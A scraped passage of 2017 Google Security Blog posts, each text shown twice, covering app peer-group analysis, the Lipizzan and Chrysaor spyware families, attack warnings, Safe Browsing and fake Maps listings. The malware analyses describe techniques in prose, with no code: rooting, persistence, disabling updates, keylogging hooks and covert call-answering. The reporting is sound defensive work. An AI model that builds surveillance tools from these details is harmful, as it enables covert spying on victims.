(2016).  Data-driven software security: Models and methods . Proceedings of the 29th IEEE Computer Security Foundations Symposium (CSF'16), Lisboa, Portugal.                                   Posted by Martin Pelikan, Giles Hogben, and Ulfar Erlingsson of Google’s Security and Privacy team  Mobile apps entertain and assist us, make it easy to communicate with friends and family, and provide tools ranging from maps to electronic wallets. But these apps could also seek more device information than they need to do their job, such as personal data and sensor data from components, like cameras and GPS trackers.  To protect our users and help developers navigate this complex environment, Google analyzes privacy and security signals for each app in Google Play. We then compare that app to other apps with similar features, known as functional peers. Creating peer groups allows us to calibrate our estimates of users’ expectations and set adequate boundaries of behaviors that may be considered unsafe or intrusive. This process helps detect apps that collect or send sensitive data without a clear need, and makes it easier for users to find apps that provide the right functionality and respect their privacy. For example, most coloring book apps don’t need to know a user’s precise location to function and this can be established by analyzing other coloring book apps. By contrast, mapping and navigation apps need to know a user’s location, and often require GPS sensor access.  One way to create app peer groups is to create a fixed set of categories and then assign each app into one or more categories, such as tools, productivity, and games. However, fixed categories are too coarse and inflexible to capture and track the many distinctions in the rapidly changing set of mobile apps. Manual curation and maintenance of such categories is also a tedious and error-prone task.  To address this, Google developed a machine-learning algorithm for clustering mobile apps with similar capabilities. Our approach uses deep learning of vector embeddings to identify peer groups of apps with similar functionality, using app metadata, such as text descriptions, and user metrics, such as installs. Then peer groups are used to identify anomalous, potentially harmful signals related to privacy and security, from each app’s requested permissions and its observed behaviors. The correlation between different peer groups and their security signals helps different teams at Google decide which apps to promote and determine which apps deserve a more careful look by our security and privacy experts. We also use the result to help app developers improve the privacy and security of their apps.    Apps are split into groups of similar functionality, and in each cluster of similar apps the established baseline is used to find anomalous privacy and security signals.  These techniques build upon earlier ideas, such as using peer groups to analyze privacy-related signals, deep learning for language models to make those peer groups better, and automated data analysis to draw conclusions.  Many teams across Google collaborated to create this algorithm and the surrounding process. Thanks to several, essential team members including Andrew Ahn, Vikas Arora, Hongji Bao, Jun Hong, Nwokedi Idika, Iulia Ion, Suman Jana, Daehwan Kim, Kenny Lim, Jiahui Liu, Sai Teja Peddinti, Sebastian Porst, Gowdy Rajappan, Aaron Rothman, Monir Sharif, Sooel Son, Michael Vrable, and Qiang Yan.  For more information on Google’s efforts to detect and fight potentially harmful apps (PHAs) on Android, see Google Android Security Team’s Classifications for Potentially Harmful Applications. References  S. Jana, Ú. Erlingsson, I. Ion (2015). Apples and Oranges: Detecting Least-Privilege Violators with Peer Group Analysis. arXiv:1510.07308 [cs.CR].  T. Mikolov, I. Sutskever, K. Chen, G. S. Corrado, J. Dean (2013). Distributed Representations of Words and Phrases and their Compositionality. Advances in Neural Information Processing Systems 26 (NIPS 2013).  Ú. Erlingsson (2016). Data-driven software security: Models and methods. Proceedings of the 29th IEEE Computer Security Foundations Symposium (CSF'16), Lisboa, Portugal.     ", "date": "July 12, 2017"},
{"website": "Google-Security", "title": "\n From Chrysaor to Lipizzan: Blocking a new targeted spyware family\n", "author": ["Posted by Megan Ruthven Android Security, Ken Bodzak Threat Analysis Group, Neel Mehta Threat Analysis Group"], "link": "https://security.googleblog.com/2017/07/from-chrysaor-to-lipizzan-blocking-new.html", "abstract": "                             Posted by Megan Ruthven Android Security, Ken Bodzak Threat Analysis Group, Neel Mehta Threat Analysis Group     Android Security is always developing new ways of using data to find and block potentially harmful apps (PHAs) from getting onto your devices. Earlier this year,  we announced  we had blocked Chrysaor targeted spyware, believed to be written by NSO Group, a cyber arms company. In the course of our Chrysaor investigation, we used similar techniques to discover a new and unrelated family of spyware called Lipizzan. Lipizzan&#8217;s code contains references to a cyber arms company, Equus Technologies.    Lipizzan is a multi-stage spyware product capable of monitoring and exfiltrating a user&#8217;s email, SMS messages, location, voice calls, and media. We have found 20 Lipizzan apps distributed in a targeted fashion to fewer than 100 devices in total and have blocked the developers and apps from the Android ecosystem. Google Play Protect has notified all affected devices and removed the Lipizzan apps.    We&#8217;ve enhanced Google Play Protect&#8217;s capabilities to detect the targeted spyware used here and will continue to use this framework to block more targeted spyware. To learn more about the methods Google uses to find targeted mobile spyware like Chrysaor and Lipizzan, attend our BlackHat talk,  Fighting Targeted Malware in the Mobile Ecosystem .     How does Lipizzan work?        Getting on a target device     Lipizzan was a sophisticated two stage spyware tool. The first stage found by Google Play Protect was distributed through several channels, including Google Play, and typically impersonated an innocuous-sounding app such as a \"Backup&#8221; or &#8220;Cleaner&#8221; app. Upon installation, Lipizzan would download and load a second \"license verification\" stage, which would survey the infected device and validate certain abort criteria. If given the all-clear, the second stage would then root the device with known exploits and begin to exfiltrate device data to a Command &amp; Control server.     Once implanted on a target device     The Lipizzan second stage was capable of performing and exfiltrating the results of the following tasks:       Call recording   VOIP recording   Recording from the device microphone   Location monitoring   Taking screenshots   Taking photos with the device camera(s)   Fetching device information and files   Fetching user information (contacts, call logs, SMS, application-specific data)        The PHA had specific routines to retrieve data from each of the following apps:       Gmail   Hangouts   KakaoTalk   LinkedIn   Messenger   Skype   Snapchat   StockEmail   Telegram   Threema   Viber   Whatsapp      We saw all of this behavior on a standalone stage 2 app, com.android.mediaserver (not related to  Android MediaServer ). This app shared a signing certificate with one of the stage 1 applications, com.app.instantbackup, indicating the same author wrote the two. We could use the following code snippet from the 2nd stage (com.android.mediaserver) to draw ties to the stage 1 applications.                Morphing first stage     After we blocked the first set of apps on Google Play, new apps were uploaded with a similar format but had a couple of differences.    The apps changed from &#8216;backup&#8217; apps to looking like a &#8220;cleaner&#8221;, &#8220;notepad&#8221;, &#8220;sound recorder&#8221;, and &#8220;alarm manager&#8221; app. The new apps were uploaded within a week of the takedown, showing that the authors have a method of easily changing the branding of the implant apps.  The app changed from downloading an unencrypted stage 2 to including stage 2 as an encrypted blob. The new stage 1 would only decrypt and load the 2nd stage if it received an intent with an AES key and IV.    Despite changing the type of app and the method to download stage 2, we were able to catch the new implant apps soon after upload.     How many devices were affected?     There were fewer than 100 devices that checked into Google Play Protect with the apps listed below. That means the family affected only 0.000007% of Android devices. Since we identified Lipizzan, Google Play Protect removed Lipizzan from affected devices and actively blocks installs on new devices.     What can you do to protect yourself?                         Ensure you are  opted into   Google Play Protect .&nbsp;   Exclusively use the Google Play store. The chance you will install a PHA is much lower on Google Play than using other install mechanisms.   Keep &#8220;unknown sources&#8221; disabled while not using it.   Keep your phone patched to the latest Android security update.         List of samples     1st stage                                Newer version&nbsp;                   Standalone 2nd stage                                                    Posted by Megan Ruthven Android Security, Ken Bodzak Threat Analysis Group, Neel Mehta Threat Analysis Group  Android Security is always developing new ways of using data to find and block potentially harmful apps (PHAs) from getting onto your devices. Earlier this year, we announced we had blocked Chrysaor targeted spyware, believed to be written by NSO Group, a cyber arms company. In the course of our Chrysaor investigation, we used similar techniques to discover a new and unrelated family of spyware called Lipizzan. Lipizzan’s code contains references to a cyber arms company, Equus Technologies.  Lipizzan is a multi-stage spyware product capable of monitoring and exfiltrating a user’s email, SMS messages, location, voice calls, and media. We have found 20 Lipizzan apps distributed in a targeted fashion to fewer than 100 devices in total and have blocked the developers and apps from the Android ecosystem. Google Play Protect has notified all affected devices and removed the Lipizzan apps.  We’ve enhanced Google Play Protect’s capabilities to detect the targeted spyware used here and will continue to use this framework to block more targeted spyware. To learn more about the methods Google uses to find targeted mobile spyware like Chrysaor and Lipizzan, attend our BlackHat talk, Fighting Targeted Malware in the Mobile Ecosystem.  How does Lipizzan work?  Getting on a target device  Lipizzan was a sophisticated two stage spyware tool. The first stage found by Google Play Protect was distributed through several channels, including Google Play, and typically impersonated an innocuous-sounding app such as a \"Backup” or “Cleaner” app. Upon installation, Lipizzan would download and load a second \"license verification\" stage, which would survey the infected device and validate certain abort criteria. If given the all-clear, the second stage would then root the device with known exploits and begin to exfiltrate device data to a Command & Control server.  Once implanted on a target device  The Lipizzan second stage was capable of performing and exfiltrating the results of the following tasks:   Call recording VOIP recording Recording from the device microphone Location monitoring Taking screenshots Taking photos with the device camera(s) Fetching device information and files Fetching user information (contacts, call logs, SMS, application-specific data)    The PHA had specific routines to retrieve data from each of the following apps:   Gmail Hangouts KakaoTalk LinkedIn Messenger Skype Snapchat StockEmail Telegram Threema Viber Whatsapp   We saw all of this behavior on a standalone stage 2 app, com.android.mediaserver (not related to Android MediaServer). This app shared a signing certificate with one of the stage 1 applications, com.app.instantbackup, indicating the same author wrote the two. We could use the following code snippet from the 2nd stage (com.android.mediaserver) to draw ties to the stage 1 applications.      Morphing first stage  After we blocked the first set of apps on Google Play, new apps were uploaded with a similar format but had a couple of differences.  The apps changed from ‘backup’ apps to looking like a “cleaner”, “notepad”, “sound recorder”, and “alarm manager” app. The new apps were uploaded within a week of the takedown, showing that the authors have a method of easily changing the branding of the implant apps. The app changed from downloading an unencrypted stage 2 to including stage 2 as an encrypted blob. The new stage 1 would only decrypt and load the 2nd stage if it received an intent with an AES key and IV.  Despite changing the type of app and the method to download stage 2, we were able to catch the new implant apps soon after upload.  How many devices were affected?  There were fewer than 100 devices that checked into Google Play Protect with the apps listed below. That means the family affected only 0.000007% of Android devices. Since we identified Lipizzan, Google Play Protect removed Lipizzan from affected devices and actively blocks installs on new devices.  What can you do to protect yourself?          Ensure you are opted into Google Play Protect.  Exclusively use the Google Play store. The chance you will install a PHA is much lower on Google Play than using other install mechanisms. Keep “unknown sources” disabled while not using it. Keep your phone patched to the latest Android security update.    List of samples  1st stage           Newer version        Standalone 2nd stage          ", "date": "July 26, 2017"},
{"website": "Google-Security", "title": "\nReassuring our users about government-backed attack warnings\n", "author": ["Posted by Shane Huntley, Google Threat Analysis Group"], "link": "https://security.googleblog.com/2017/03/reassuring-our-users-about-government.html", "abstract": "                             Posted by Shane Huntley, Google Threat Analysis Group      Since 2012 , we&#8217;ve warned our users if we believe their Google accounts are being targeted by government-backed attackers.    We send these out of an abundance of caution &#8212; the notice does not necessarily mean that the account has been compromised or that there is a widespread attack. Rather, the notice reflects our assessment that a government-backed attacker has likely attempted to access the user&#8217;s account or computer through phishing or malware, for example. You can read more about these warnings  here .               In order to secure some of the details of our detection, we often send a batch of warnings to groups of at-risk users at the same time, and not necessarily in real-time. Additionally, we never indicate which government-backed attackers we think are responsible for the attempts; different users may be targeted by different attackers.    Security has always been a top priority for us. Robust, automated protections help prevent scammers from signing into your Google account,  Gmail always uses an encrypted connection  when you receive or send email, we filter more than  99.9% of spam &nbsp;&#8212; a common source of phishing messages &#8212; from Gmail, and we show users when messages are from an  unverified or unencrypted source .    An extremely small fraction of users will ever see one of these warnings, but if you receive this warning from us, it's important to  take action on it . You can always take a two-minute  Security Checkup , and for  maximum protection from phishing , enable two-step verification with a Security Key.                                     Posted by Shane Huntley, Google Threat Analysis Group  Since 2012, we’ve warned our users if we believe their Google accounts are being targeted by government-backed attackers.  We send these out of an abundance of caution — the notice does not necessarily mean that the account has been compromised or that there is a widespread attack. Rather, the notice reflects our assessment that a government-backed attacker has likely attempted to access the user’s account or computer through phishing or malware, for example. You can read more about these warnings here.      In order to secure some of the details of our detection, we often send a batch of warnings to groups of at-risk users at the same time, and not necessarily in real-time. Additionally, we never indicate which government-backed attackers we think are responsible for the attempts; different users may be targeted by different attackers.  Security has always been a top priority for us. Robust, automated protections help prevent scammers from signing into your Google account, Gmail always uses an encrypted connection when you receive or send email, we filter more than 99.9% of spam — a common source of phishing messages — from Gmail, and we show users when messages are from an unverified or unencrypted source.  An extremely small fraction of users will ever see one of these warnings, but if you receive this warning from us, it's important to take action on it. You can always take a two-minute Security Checkup, and for maximum protection from phishing, enable two-step verification with a Security Key.     ", "date": "March 24, 2017"},
{"website": "Google-Security", "title": "\nUpdates to the Google Safe Browsing’s Site Status Tool\n", "author": ["Posted Deeksha Padma Prasad and Allison Miller, Safe Browsing"], "link": "https://security.googleblog.com/2017/03/updates-to-google-safe-browsings-site.html", "abstract": "                             Posted Deeksha Padma Prasad and Allison Miller, Safe Browsing      Google Safe Browsing  gives users tools to help protect themselves from web-based threats like malware, unwanted software, and social engineering. We are best known for our warnings, which users see when they attempt to navigate to dangerous sites or download dangerous files. We also provide other tools, like the  Site Status Tool , where people can check the current safety status of a web page (without having to visit it).    We host this tool within Google&#8217;s   Safe Browsing Transparency Report . As with other sections in Google&#8217;s  Transparency Report,  we make this data available to give the public more visibility into the security and health of the online ecosystem. Users of the  Site Status Tool  input a webpage (as a URL, website, or domain) into the tool, and the most recent results of the Safe Browsing analysis for that webpage are returned...plus references to troubleshooting help and educational materials.               We&#8217;ve just launched a new version of the  Site Status Tool  that provides simpler, clearer results and is better designed for the primary users of the page: people who are visiting the tool from a Safe Browsing warning they&#8217;ve received, or doing casual research on Google&#8217;s malware and phishing detection. The tool now features a cleaner UI, easier-to-interpret language, and more precise results. We&#8217;ve also moved some of the more technical data on associated ASes (autonomous systems) over to the  malware dashboard section of the report .    &nbsp;While the interface has been streamlined, additional diagnostic information is not gone: researchers who wish to find more details can drill-down elsewhere in  Safe Browsing&#8217;s Transparency Report , while site-owners can find additional diagnostic information in  Search Console . One of the goals of the Transparency Report is to shed light on complex policy and security issues, so, we hope the design adjustments will indeed provide our users with additional clarity.                                   Posted Deeksha Padma Prasad and Allison Miller, Safe Browsing  Google Safe Browsing gives users tools to help protect themselves from web-based threats like malware, unwanted software, and social engineering. We are best known for our warnings, which users see when they attempt to navigate to dangerous sites or download dangerous files. We also provide other tools, like the Site Status Tool, where people can check the current safety status of a web page (without having to visit it).  We host this tool within Google’s  Safe Browsing Transparency Report. As with other sections in Google’s Transparency Report, we make this data available to give the public more visibility into the security and health of the online ecosystem. Users of the Site Status Tool input a webpage (as a URL, website, or domain) into the tool, and the most recent results of the Safe Browsing analysis for that webpage are returned...plus references to troubleshooting help and educational materials.      We’ve just launched a new version of the Site Status Tool that provides simpler, clearer results and is better designed for the primary users of the page: people who are visiting the tool from a Safe Browsing warning they’ve received, or doing casual research on Google’s malware and phishing detection. The tool now features a cleaner UI, easier-to-interpret language, and more precise results. We’ve also moved some of the more technical data on associated ASes (autonomous systems) over to the malware dashboard section of the report.   While the interface has been streamlined, additional diagnostic information is not gone: researchers who wish to find more details can drill-down elsewhere in Safe Browsing’s Transparency Report, while site-owners can find additional diagnostic information in Search Console. One of the goals of the Transparency Report is to shed light on complex policy and security issues, so, we hope the design adjustments will indeed provide our users with additional clarity.     ", "date": "March 29, 2017"},
{"website": "Google-Security", "title": "\nAn Investigation of Chrysaor Malware on Android\n", "author": ["Posted by Rich Cannings, Jason Woloz, Neel Mehta, Ken Bodzak, Wentao Chang, Megan Ruthven"], "link": "https://security.googleblog.com/2017/04/an-investigation-of-chrysaor-malware-on.html", "abstract": "                             Posted by Rich Cannings, Jason Woloz, Neel Mehta, Ken Bodzak, Wentao Chang, Megan Ruthven     Google is constantly working to improve our systems that protect users from  Potentially Harmful Applications  (PHAs). Usually, PHA authors attempt to install their harmful apps on as many devices as possible. However, a few PHA authors spend substantial effort, time, and money to create and install their harmful app on one or a very small number of devices. This is known as a  targeted attack .    In this blog post, we describe Chrysaor, a newly discovered family of spyware that was used in a targeted attack on a small number of Android devices, and how investigations like this help Google protect Android users from a variety of threats.     What is Chrysaor?     Chrysaor is spyware believed to be created by  NSO Group Technologies , specializing in the creation and sale of software and infrastructure for targeted attacks. Chrysaor is believed to be related to the Pegasus spyware that was  first identified on iOS  and analyzed by  Citizen Lab  and  Lookout .    Late last year, after receiving a list of suspicious package names from Lookout, we discovered that a few dozen Android devices may have installed an application related to Pegasus, which we named Chrysaor. Although the applications were never available in Google Play, we immediately identified the scope of the problem by using  Verify Apps .  We gathered information from affected devices, and concurrently, attempted to acquire Chrysaor apps to better understand its impact on users. We&#8217;ve contacted the potentially affected users, disabled the applications on affected devices, and implemented changes in Verify Apps to protect all users.     What is the scope of Chrysaor?     Chrysaor was never available in Google Play and had a very low volume of installs outside of Google Play. Among the over 1.4 billion devices protected by Verify Apps, we observed fewer than 3 dozen installs of Chrysaor on victim devices. These devices were located in the following countries:              How we protect you     To protect Android devices and users, Google Play provides a complete set of security services that update outside of platform releases. Users don&#8217;t have to install any additional security services to keep their devices safe. In 2016, these services protected over 1.4 billion devices, making Google one of the largest providers of on-device security services in the world:        Identify PHAs  using people, systems in the cloud, and data sent to us from devices&nbsp;    Warn users about or blocking users from installing PHAs &nbsp;    Continually scan devices for PHAs and other harmful threats&nbsp;     Additionally, we are providing detailed technical information to help the security industry in our collective work against PHAs.     What do I need to do?     It is extremely unlikely you or someone you know was affected by Chrysaor malware. Through our investigation, we identified less than 3 dozen devices affected by Chrysaor, we have disabled Chrysaor on those devices, and we have notified users of all known affected devices.  Additionally, the improvements we made to our protections have been enabled for all users of our security services.    To ensure you are fully protected against PHAs and other threats, we recommend these 5 basic steps:        Install apps only from reputable sources:  Install apps from a reputable source, such as  Google Play . No Chrysaor apps were on Google Play.&nbsp;     Enable a secure lock screen :  Pick a PIN, pattern, or password that is easy for you to remember and hard for others to guess.&nbsp;     Update your device :  Keep your device up-to-date with the latest security patches.&nbsp;     Verify Apps:   Ensure&nbsp;Verify Apps is enabled.&nbsp;    Locate your device:  Practice finding your device with  Android Device Manager  because you are far more likely to lose your device than install a PHA.&nbsp;     How does Chrysaor work?&nbsp;     To install Chrysaor, we believe an attacker coaxed specifically targeted individuals to download the malicious software onto their device. Once Chrysaor is installed, a remote operator is able to surveil the victim&#8217;s activities on the device and within the vicinity, leveraging microphone, camera, data collection, and logging and tracking application activities on communication apps such as phone and SMS.    One representative sample Chrysaor app that we analyzed was tailored to devices running Jellybean (4.3) or earlier. The following is a review of scope and impact of the Chrysaor app named com.network.android tailored for a Samsung device target, with SHA256 digest:      ade8bef0ac29fa363fc9afd958af0074478aef650adeb0318517b48bd996d5d5&nbsp;      Upon installation, the app uses known framaroot exploits to escalate privileges and break Android&#8217;s application sandbox. If the targeted device is not vulnerable to these exploits, then the app attempts to use  a superuser binary pre-positioned at /system/csk to elevate privileges.    After escalating privileges, the app immediately protects itself and starts to collect data, by:       Installing itself on the /system partition to persist across factory resets&nbsp;   Removing Samsung&#8217;s system update app (com.sec.android.fotaclient) and disabling auto-updates to maintain persistence (sets Settings.System.SOFTWARE_UPDATE_AUTO_UPDATE to 0)&nbsp;   Deleting WAP push messages and changing WAP message settings, possibly for anti-forensic purpose.&nbsp;   Starting content observers and the main task loop to receive remote commands and exfiltrate data.    The app uses six techniques to collect user data:        Repeated commands:  use alarms to periodically repeat actions on the device to expose data, including gathering location data.&nbsp;    Data collectors:  dump all existing content on the device into a queue. Data collectors are used in conjunction with repeated commands to collect user data including, SMS settings, SMS messages, Call logs, Browser History, Calendar, Contacts, Emails, and messages from selected messaging apps, including WhatsApp, Twitter, Facebook, Kakoa, Viber, and Skype by making /data/data directories of the apps world readable.&nbsp;    Content observers:  use Android&#8217;s  ContentObserver  framework to gather changes in SMS, Calendar, Contacts, Cell info, Email, WhatsApp, Facebook, Twitter, Kakao, Viber, and Skype.&nbsp;    Screenshots:  captures an image of the current screen via the raw frame buffer.&nbsp;    Keylogging:  record input events by hooking  IPCThreadState::Transact from /system/lib/libbinder.so, and intercepting android::parcel with the interface com.android.internal.view.IInputContext.&nbsp;     RoomTap:  silently answers a telephone call and stays connected in the background, allowing the caller to hear conversations within the range of the phone's microphone. If the user unlocks their device, they will see a black screen while the app drops the call, resets call settings and prepares for the user to interact with the device normally.&nbsp;    Finally, the app can remove itself through three ways:       Via a command from the server&nbsp;   Autoremove if the device has not been able to check in to the server after 60 days&nbsp;   Via an antidote file. If /sdcard/MemosForNotes was present on the device, the Chrysaor app removes itself from the device.     Samples uploaded to VirusTotal     To encourage further research in the security community, we&#8217;ve uploaded these sample Chrysaor apps to Virus Total.              Additional digests with links to Chrysaor&nbsp;     As a result of our investigation we have identified these additional Chrysaor-related apps.             Lookout has completed their own independent analysis of the samples we acquired, their report can be viewed  here .                                   Posted by Rich Cannings, Jason Woloz, Neel Mehta, Ken Bodzak, Wentao Chang, Megan Ruthven  Google is constantly working to improve our systems that protect users from Potentially Harmful Applications (PHAs). Usually, PHA authors attempt to install their harmful apps on as many devices as possible. However, a few PHA authors spend substantial effort, time, and money to create and install their harmful app on one or a very small number of devices. This is known as a targeted attack.  In this blog post, we describe Chrysaor, a newly discovered family of spyware that was used in a targeted attack on a small number of Android devices, and how investigations like this help Google protect Android users from a variety of threats.  What is Chrysaor?  Chrysaor is spyware believed to be created by NSO Group Technologies, specializing in the creation and sale of software and infrastructure for targeted attacks. Chrysaor is believed to be related to the Pegasus spyware that was first identified on iOS and analyzed by Citizen Lab and Lookout.  Late last year, after receiving a list of suspicious package names from Lookout, we discovered that a few dozen Android devices may have installed an application related to Pegasus, which we named Chrysaor. Although the applications were never available in Google Play, we immediately identified the scope of the problem by using Verify Apps.  We gathered information from affected devices, and concurrently, attempted to acquire Chrysaor apps to better understand its impact on users. We’ve contacted the potentially affected users, disabled the applications on affected devices, and implemented changes in Verify Apps to protect all users.  What is the scope of Chrysaor?  Chrysaor was never available in Google Play and had a very low volume of installs outside of Google Play. Among the over 1.4 billion devices protected by Verify Apps, we observed fewer than 3 dozen installs of Chrysaor on victim devices. These devices were located in the following countries:     How we protect you  To protect Android devices and users, Google Play provides a complete set of security services that update outside of platform releases. Users don’t have to install any additional security services to keep their devices safe. In 2016, these services protected over 1.4 billion devices, making Google one of the largest providers of on-device security services in the world:   Identify PHAs using people, systems in the cloud, and data sent to us from devices  Warn users about or blocking users from installing PHAs  Continually scan devices for PHAs and other harmful threats   Additionally, we are providing detailed technical information to help the security industry in our collective work against PHAs.  What do I need to do?  It is extremely unlikely you or someone you know was affected by Chrysaor malware. Through our investigation, we identified less than 3 dozen devices affected by Chrysaor, we have disabled Chrysaor on those devices, and we have notified users of all known affected devices.  Additionally, the improvements we made to our protections have been enabled for all users of our security services.  To ensure you are fully protected against PHAs and other threats, we recommend these 5 basic steps:   Install apps only from reputable sources: Install apps from a reputable source, such as Google Play. No Chrysaor apps were on Google Play.  Enable a secure lock screen: Pick a PIN, pattern, or password that is easy for you to remember and hard for others to guess.  Update your device: Keep your device up-to-date with the latest security patches.  Verify Apps: Ensure Verify Apps is enabled.  Locate your device: Practice finding your device with Android Device Manager because you are far more likely to lose your device than install a PHA.   How does Chrysaor work?   To install Chrysaor, we believe an attacker coaxed specifically targeted individuals to download the malicious software onto their device. Once Chrysaor is installed, a remote operator is able to surveil the victim’s activities on the device and within the vicinity, leveraging microphone, camera, data collection, and logging and tracking application activities on communication apps such as phone and SMS.  One representative sample Chrysaor app that we analyzed was tailored to devices running Jellybean (4.3) or earlier. The following is a review of scope and impact of the Chrysaor app named com.network.android tailored for a Samsung device target, with SHA256 digest:  ade8bef0ac29fa363fc9afd958af0074478aef650adeb0318517b48bd996d5d5   Upon installation, the app uses known framaroot exploits to escalate privileges and break Android’s application sandbox. If the targeted device is not vulnerable to these exploits, then the app attempts to use  a superuser binary pre-positioned at /system/csk to elevate privileges.  After escalating privileges, the app immediately protects itself and starts to collect data, by:   Installing itself on the /system partition to persist across factory resets  Removing Samsung’s system update app (com.sec.android.fotaclient) and disabling auto-updates to maintain persistence (sets Settings.System.SOFTWARE_UPDATE_AUTO_UPDATE to 0)  Deleting WAP push messages and changing WAP message settings, possibly for anti-forensic purpose.  Starting content observers and the main task loop to receive remote commands and exfiltrate data.  The app uses six techniques to collect user data:   Repeated commands: use alarms to periodically repeat actions on the device to expose data, including gathering location data.  Data collectors: dump all existing content on the device into a queue. Data collectors are used in conjunction with repeated commands to collect user data including, SMS settings, SMS messages, Call logs, Browser History, Calendar, Contacts, Emails, and messages from selected messaging apps, including WhatsApp, Twitter, Facebook, Kakoa, Viber, and Skype by making /data/data directories of the apps world readable.  Content observers: use Android’s ContentObserver framework to gather changes in SMS, Calendar, Contacts, Cell info, Email, WhatsApp, Facebook, Twitter, Kakao, Viber, and Skype.  Screenshots: captures an image of the current screen via the raw frame buffer.  Keylogging: record input events by hooking IPCThreadState::Transact from /system/lib/libbinder.so, and intercepting android::parcel with the interface com.android.internal.view.IInputContext.  RoomTap: silently answers a telephone call and stays connected in the background, allowing the caller to hear conversations within the range of the phone's microphone. If the user unlocks their device, they will see a black screen while the app drops the call, resets call settings and prepares for the user to interact with the device normally.   Finally, the app can remove itself through three ways:   Via a command from the server  Autoremove if the device has not been able to check in to the server after 60 days  Via an antidote file. If /sdcard/MemosForNotes was present on the device, the Chrysaor app removes itself from the device.  Samples uploaded to VirusTotal  To encourage further research in the security community, we’ve uploaded these sample Chrysaor apps to Virus Total.     Additional digests with links to Chrysaor   As a result of our investigation we have identified these additional Chrysaor-related apps.     Lookout has completed their own independent analysis of the samples we acquired, their report can be viewed here.     ", "date": "April 3, 2017"},
{"website": "Google-Security", "title": "\nNew Research: Keeping fake listings off Google Maps\n", "author": ["Posted by Doug Grundman, Maps Anti-Abuse, and Kurt Thomas, Security & Anti-Abuse Research"], "link": "https://security.googleblog.com/2017/04/new-research-keeping-fake-listings-off.html", "abstract": "                             Posted by Doug Grundman, Maps Anti-Abuse, and Kurt Thomas, Security &amp; Anti-Abuse Research      Google My Business  enables millions of business owners to create listings and share information about their business on Google Maps and Search, making sure everything is up-to-date and accurate for their customers. Unfortunately, some actors attempt to abuse this service to register fake listings in order to defraud legitimate business owners, or to  charge exorbitant service fees for services .    Over a year ago, we teamed up with the University of California, San Diego to research the actors behind fake listings, in order to improve our products and keep our users safe. The full report,  &#8220;Pinning Down Abuse on Google Maps&#8221; , will be presented tomorrow at the 2017  International World Wide Web Conference .    Our study shows that fewer than 0.5% of local searches lead to fake listings. We&#8217;ve also improved how we verify new businesses, which has reduced the number of fake listings by 70% from its all-time peak back in June 2015.     What is a fake listing?   For over a year, we tracked the bad actors behind fake listings. &nbsp;Unlike email-based scams  selling knock-off products online , local listing scams require physical proximity to potential victims. This fundamentally changes both the scale and types of abuse possible.    Bad actors posing as locksmiths, plumbers, electricians, and other contractors were the most common source of abuse&#8212;roughly 2 out of 5 fake listings. The actors operating these fake listings would cycle through non-existent postal addresses and disposable VoIP phone numbers even as their listings were discovered and disabled. The purported addresses for these businesses were irrelevant as the contractors would travel directly to potential victims.    Another 1 in 10 fake listings belonged to real businesses that bad actors had improperly claimed ownership over, such as hotels and restaurants. While making a reservation or ordering a meal was indistinguishable from the real thing, behind the scenes, the bad actors would deceive the actual business into paying referral fees for organic interest.     How does Google My Business verify information?   Google My Business currently verifies the information provided by business owners before making it available to users. For freshly created listings, we physically mail a postcard to the new listings&#8217; address to ensure the location really exists. For businesses changing owners, we make an automated call to the listing&#8217;s phone number to verify the change.         Unfortunately, our research showed that these processes can be abused to get fake listings on Google Maps. Fake contractors would request hundreds of postcard verifications to non-existent suites at a single address, such as 123 Main St #456 and 123 Main St #789, or to stores that provided PO boxes. Alternatively, a phishing attack could maliciously repurpose freshly verified business listings by tricking &nbsp;the legitimate owner into sharing verification information sent either by phone or postcard.     Keeping deceptive businesses out &#8212; by the numbers   Leveraging our study&#8217;s findings, we&#8217;ve made significant changes to how we verify addresses and are even  piloting an advanced verification process  for locksmiths and plumbers. Improvements we&#8217;ve made include prohibiting bulk registrations at most addresses, preventing businesses from relocating impossibly far from their original address without additional verification, and detecting and ignoring intentionally mangled text in address fields designed to confuse our algorithms. We have also adapted our anti-spam machine learning systems to detect data discrepancies common to fake or deceptive listings.    Combined, here&#8217;s how these defenses stack up:         We detect and disable 85% of fake listings before they even appear on Google Maps.   We&#8217;ve reduced the number of abusive listings by 70% from its peak back in June 2015.   We&#8217;ve also reduced the number of impressions to abusive listings by 70%.        As we&#8217;ve shown, verifying local information comes with a number of unique anti-abuse challenges. While fake listings may slip through our defenses from time to time, we are constantly improving our systems to better serve both users and business owners.                                      Posted by Doug Grundman, Maps Anti-Abuse, and Kurt Thomas, Security & Anti-Abuse Research  Google My Business enables millions of business owners to create listings and share information about their business on Google Maps and Search, making sure everything is up-to-date and accurate for their customers. Unfortunately, some actors attempt to abuse this service to register fake listings in order to defraud legitimate business owners, or to charge exorbitant service fees for services.  Over a year ago, we teamed up with the University of California, San Diego to research the actors behind fake listings, in order to improve our products and keep our users safe. The full report, “Pinning Down Abuse on Google Maps”, will be presented tomorrow at the 2017 International World Wide Web Conference.  Our study shows that fewer than 0.5% of local searches lead to fake listings. We’ve also improved how we verify new businesses, which has reduced the number of fake listings by 70% from its all-time peak back in June 2015.  What is a fake listing? For over a year, we tracked the bad actors behind fake listings.  Unlike email-based scams selling knock-off products online, local listing scams require physical proximity to potential victims. This fundamentally changes both the scale and types of abuse possible.  Bad actors posing as locksmiths, plumbers, electricians, and other contractors were the most common source of abuse—roughly 2 out of 5 fake listings. The actors operating these fake listings would cycle through non-existent postal addresses and disposable VoIP phone numbers even as their listings were discovered and disabled. The purported addresses for these businesses were irrelevant as the contractors would travel directly to potential victims.  Another 1 in 10 fake listings belonged to real businesses that bad actors had improperly claimed ownership over, such as hotels and restaurants. While making a reservation or ordering a meal was indistinguishable from the real thing, behind the scenes, the bad actors would deceive the actual business into paying referral fees for organic interest.  How does Google My Business verify information? Google My Business currently verifies the information provided by business owners before making it available to users. For freshly created listings, we physically mail a postcard to the new listings’ address to ensure the location really exists. For businesses changing owners, we make an automated call to the listing’s phone number to verify the change.    Unfortunately, our research showed that these processes can be abused to get fake listings on Google Maps. Fake contractors would request hundreds of postcard verifications to non-existent suites at a single address, such as 123 Main St #456 and 123 Main St #789, or to stores that provided PO boxes. Alternatively, a phishing attack could maliciously repurpose freshly verified business listings by tricking  the legitimate owner into sharing verification information sent either by phone or postcard.  Keeping deceptive businesses out — by the numbers Leveraging our study’s findings, we’ve made significant changes to how we verify addresses and are even piloting an advanced verification process for locksmiths and plumbers. Improvements we’ve made include prohibiting bulk registrations at most addresses, preventing businesses from relocating impossibly far from their original address without additional verification, and detecting and ignoring intentionally mangled text in address fields designed to confuse our algorithms. We have also adapted our anti-spam machine learning systems to detect data discrepancies common 